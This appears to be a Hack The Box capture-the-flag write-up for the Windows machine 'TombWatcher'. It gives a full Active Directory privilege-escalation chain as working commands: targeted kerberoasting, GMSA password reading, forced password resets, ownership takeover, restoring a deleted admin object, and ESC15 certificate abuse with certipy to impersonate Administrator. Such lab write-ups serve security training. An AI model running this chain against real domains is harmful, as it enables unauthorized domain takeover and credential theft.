summary:  Early situational awareness with Bloodhound reveals common ACEs throughout multiple users and navigating through them gets the user flag. After enumerating the target machine, there is an empty OU but also a tombstoned object which is a privileged user in the OU that has access to enumerate vulnerable certificates and discovering it was ESC15. Thus, gaining DA

Scanning shows we are dealing with AD. Like always, let's start enumerating SMB with the given credentials

```
❯ nxc smb 10.10.11.70 -u 'henry' -p 'H3nry_987TGV!' --shares
❯ nxc smb 10.10.11.70 -u 'henry' -p 'H3nry_987TGV!' --users
```

![Description](/static/images/htb/windows/tombwatcher/1.jpg)

We can see a few users there, write them down in a file called `users.txt`, we don't have any permission to any of the non-default share.

---

## Bloodhound

With credentials given, we can gain situational awareness by gathering Bloodhound data.

```
❯ nxc ldap 10.10.11.72 -u 'henry' -p 'H3nry_987TGV!' --dns-server 10.10.11.72 --bloodhound --collection All
```

![Description](/static/images/htb/windows/tombwatcher/2.jpg)

![Description](/static/images/htb/windows/tombwatcher/3.jpg)

Observe `henry` has `WriteSPN` ACE over `alfred`. The gives us the ability to write directly to the servicePrincipalNames 
attribute on a user object. Writing to this property gives us the opportunity to perform a targeted kerberoasting attack against that user.

I will be using Powerview for this.

```
❯ powerview 'henry':'H3nry_987TGV!'@10.10.11.72

PV ❯ Set-DomainObject -Identity alfred -Set serviceprincipalname='pwned/tombwatcher.htb'
```

![Description](/static/images/htb/windows/tombwatcher/4.jpg)

Now we can perform kerberoasting

```
PV ❯ Invoke-Kerberoast alfred
```

![Description](/static/images/htb/windows/tombwatcher/5.jpg)

Now, we have the TGS. We can crack it using Hashcat

![Description](/static/images/htb/windows/tombwatcher/6.jpg)

`alfred:basketball`

Now, we check Bloodhound again to look for Outbound Object Controls in which we have One

![Description](/static/images/htb/windows/tombwatcher/7.jpg)

`alfred` has `AddSelf` ACE over the `Infrastructure` group. He can add himself to the group and gain 
the same privileges. Again, we can use Powerview for this

```
❯ powerview 'alfred':'basketball'@10.10.11.72

PV ❯ Add-DomainGroupMember -Identity 'Infrastructure' -Members 'alfred'
```

![Description](/static/images/htb/windows/tombwatcher/8.jpg)

We check Bloodhound again

![Description](/static/images/htb/windows/tombwatcher/9.jpg)

Observe the `Infrastructure` group has `ReadGMSAPassword` over the `ansible_dev$` group which is also
a GMSA (Group Managed Service Account).

We can abuse this using Netexec which will dump the NTLM

```
❯ nxc ldap -u alfred -p basketball --gmsa
```

![Description](/static/images/htb/windows/tombwatcher/10.jpg)

Then, we check Bloodhound again for the `ansible_dev$` group, we see it has `ForceChangePassword` ACE over
user `Sam`

![Description](/static/images/htb/windows/tombwatcher/11.jpg)

This indicates the GMSA can reset the password of user 'sam`. I tried to crack the NTLM but it didn't work,
I did some digging and found out that Netexec has a module to reset the password using the GMSA's NTLM hash!

![Description](/static/images/htb/windows/tombwatcher/12.jpg)

```
❯ nxc smb 10.10.11.72 -u 'ansible_dev$' -H '1c37d00093dc2a5f25176bf2d474afdc' -M change-password -o USER=sam NEWPASS=Password123!
```

![Description](/static/images/htb/windows/tombwatcher/13.jpg)

After changing his password, we look at Bloodhound once more and find that `sam` has `WriteOwner` over
user `john`. Using BloodyAD, we can change the ownership of the `user` account and change the password after gaining ownership

```
❯ bloodyAD --host 10.10.11.72 -d tombwatcher.htb -u sam -p Password123! set owner "john" "sam"
❯ bloodyAD --host 10.10.11.72 -d tombwatcher.htb -u sam -p Password123! set password "john" 'Password123'
```

![Description](/static/images/htb/windows/tombwatcher/14.jpg)

Also notice that `john` is a part of the `winrm` group

![Description](/static/images/htb/windows/tombwatcher/15.jpg)

We can easily log in and get the user flag

![Description](/static/images/htb/windows/tombwatcher/16.jpg)

I looked at Bloodhound and saw an empty OU, `ADCS` with `GenericAll`, this was a bit weird and I got stuck here.

![Description](/static/images/htb/windows/tombwatcher/17.jpg)

Now, I tried everything like Winpeas didn't find anything and certipy did not found any vulnerable certificates.
So, I looked up the name of the machine which is "tombstone" and I found something promising. According to this [post](https://reintech.io/blog/handling-active-directory-tombstoned-objects-reanimation),
we can enumerate deleted objects and reanimate them like a zombie xD.

I modified the command to enumerate like so:

```
*Evil-WinRM* PS> Get-ADObject -Filter 'isDeleted -eq $true -and objectClass -eq "user"' -IncludeDeletedObjects -Properties *
```

![Description](/static/images/htb/windows/tombwatcher/18.jpg)

We can see a deleted user `cert_admin` that belongs to the `ADCS` OU. Let us raise him from the dead using his DN (Distinguished Name)

```
*Evil-WinRM* PS> Restore-ADObject -Identity "CN=cert_admin\0ADEL:f80369c8-96a2-4a7f-a56c-9c15edd7d1e3,CN=Deleted Objects,DC=tombwatcher,DC=htb"
```

![Description](/static/images/htb/windows/tombwatcher/19.jpg)

It was supposed to work, but we get this error because someone else already reanimated him, I am very lazy to reset the machine
so let us proceed with gathering Bloodhound data and upload to our ingestor.

![Description](/static/images/htb/windows/tombwatcher/20.jpg)

We can see `svc_admin` here and a random machine account came from nowhere can ignore that one I guess lol. Apart from
that, we have `GenericAll` over `svc_admin`. We can easily change his password

```
❯ bloodyAD --host 10.10.11.72 -d tombwatcher.htb -u john -p Password1234! set password "cert_admin" 'Password123!'
```

![Description](/static/images/htb/windows/tombwatcher/21.jpg)

Now, we can try to enumerate vulnerable certificates

```
❯ certipy find -u cert_admin -p Password123! -target 10.10.11.72 -stdout -vulnerable
```

Observe it is vulnerable to ESC15, we can just follow this [guide](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu)
to exploit ESC15

I tried the first scenario, Scenario A: Direct Impersonation via Schannel (Injecting "Client Authentication" Application Policy)
but that failed to spawn the LDAP shell, so I proceeded to use the Scenario B, PKINIT/Kerberos Impersonation via Enrollment Agent Abuse (Injecting "Certificate Request Agent" Application Policy)

Request a certificate from the V1 template as the attacker

```
❯ certipy req -u 'cert_admin' -p 'Password123!' -dc-ip '10.10.11.72' -target 'tombwatcher.htb' -ca 'tombwatcher-CA-1' -template 'WebServer' -application-policies 'Certificate Request Agent'
```

![Description](/static/images/htb/windows/tombwatcher/22.jpg)

Then, Use the attacker certificate to request a certificate on behalf of a target privileged user.
In this case, its the `Administrator`

```
❯ certipy req -u 'cert_admin' -p 'Password123!' -dc-ip '10.10.11.72' -target 'tombwatcher.htb' -ca 'tombwatcher-CA-1' -template 'User' -pfx cert_admin.pfx -on-behalf-of 'tombwatcher\Administrator'
```

![Description](/static/images/htb/windows/tombwatcher/24.jpg)

Now, we authenticate using the Administartor's cert/private key

```
❯ certipy auth -pfx 'administrator.pfx' -dc-ip '10.10.11.72'
```

![Description](/static/images/htb/windows/tombwatcher/25.jpg)

Now, just winrm and get da root flag
